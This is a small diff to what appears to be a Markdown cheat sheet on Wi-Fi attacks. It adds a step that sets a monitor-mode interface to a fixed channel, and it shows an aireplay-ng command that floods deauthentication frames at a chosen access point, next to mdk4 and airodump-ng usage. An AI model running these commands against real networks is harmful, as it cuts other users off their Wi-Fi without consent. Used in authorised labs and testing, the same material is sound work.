@@ -74,7 +74,11 @@ mdk4 wlan0mon d
 ```
 sh wlan0mon && airodump-ng wlan0mon
 ```
-> 2.Deauth a specific BSSID
+> 2. Set specific channel
+```
+iw dev wlan0mon set channel 6
+```
+> 3.Deauth a specific BSSID
 ```
 aireplay-ng wlan0mon --deauth 0 -a (BSSID) --ignore-negative-one
 ```
